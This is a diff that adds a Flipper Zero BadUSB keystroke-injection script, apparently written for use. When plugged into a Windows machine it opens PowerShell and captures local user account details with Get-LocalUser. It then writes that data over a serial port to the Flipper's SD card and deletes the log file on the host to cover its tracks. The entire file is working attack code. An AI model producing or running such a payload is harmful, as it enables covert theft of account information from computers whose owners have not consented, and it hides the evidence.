@@ -1,0 +1,36 @@
+REM 
+REM TITLE: LOCAL USER INFO EXFILL TO FLIPPER ZERO SD CARD.
+REM DESC: LOCAL USER INFORMATION GRAB AND EXFILL TO FLIPPERS STORAGE.
+REM AUTHOR: EVXN.
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 1000
+STRING Start-Transcript -Path "$home\Log.txt";
+ENTER
+STRING Get-LocalUser | Select *
+ENTER
+STRING Stop-Transcript;
+ENTER
+DELAY 200
+STRING CD $home
+ENTER
+STRING $d=(Get-Content Log.txt|Out-String);
+REM ## The VendorID and ProductID to search. If you change the BadUSB IDs in this script, you need to change $BHID as well.
+STRING $BHID="HID\\VID_046D\&PID_C529";
+STRING $SUSB="USB\\VID_0483\&PID_5740";
+REM ## The trorage Path where the result is SPATHed at the Flipper Zero SD card
+STRING $SPATH="/ext/apps_data/getlocaluser_info.txt"
+ENTER
+DELAY 500
+STRING 1..600|%{Try{$p=New-Object System.IO.Ports.SerialPort("COM$(((Get-PNPDevice -PresentOnly -Class 'Ports' -InstanceID 'USB\VID_0483&PID_5740*') -split "COM")[1][0])",115200,'None',8,'one');$p.open();$p.Write("storage write $SPATH `r`n");$p.Write($d);$p.Write("$([char] 3)");$p.Close();break}Catch{Sleep 1}};
+ENTER
+REM ## PRESS BACK 2x TO SAVE DATA !!!
+DELAY 1000
+STRING Remove-Item -Path $home\Log.txt
+ENTER
+STRING EXIT
+ENTER 
